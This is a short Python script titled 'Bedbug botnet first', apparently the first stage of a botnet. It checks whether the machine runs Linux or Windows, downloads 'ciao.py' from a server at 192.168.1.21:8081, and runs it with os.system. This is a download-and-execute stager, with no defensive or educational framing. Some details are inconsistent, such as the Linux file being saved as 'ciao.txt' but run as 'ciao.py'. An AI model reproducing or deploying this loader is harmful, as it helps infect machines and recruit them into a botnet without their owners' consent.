## Bedbug botnet first 

# Phase 1: Identify machine if Win / Linux
import platform
import os
import urllib.request

whatBed = os.popen("uname -a").read().split(" ")[0].lower()

def getPayload():
    if whatBed == "linux":
        return {
            "installPath": "/tmp",
            "payload": "ciao.txt",
            "download": "http://192.168.1.21:8081/ciao.py",
            "execCommand": "python3 ciao.py",
        }
    else:
        return {
            "installPath": "C:\\Program Files\\Bedbug",
            "payload": "C:\\tmp\\ciao.py",
            "download": "http://192.168.1.21:8081/ciao.py",
            "execCommand": "python3 C:\\tmp\\ciao.py",
        }
    return print("Payload not found")

def downloadPayload(payload):
    r = urllib.request.urlretrieve(payload["download"], payload["payload"])
    print("r: ", r)
    if r:
        print("Payload downloaded successfully")
        # with open(payload["payload"], "w") as f:
        #     f.write(response.text)
    else:
        return print("Failed to download payload")


# Phase 1: Download the payload
downloadPayload(getPayload())

# Phase 2: Execute the payload
os.system(getPayload()["execCommand"])
## 
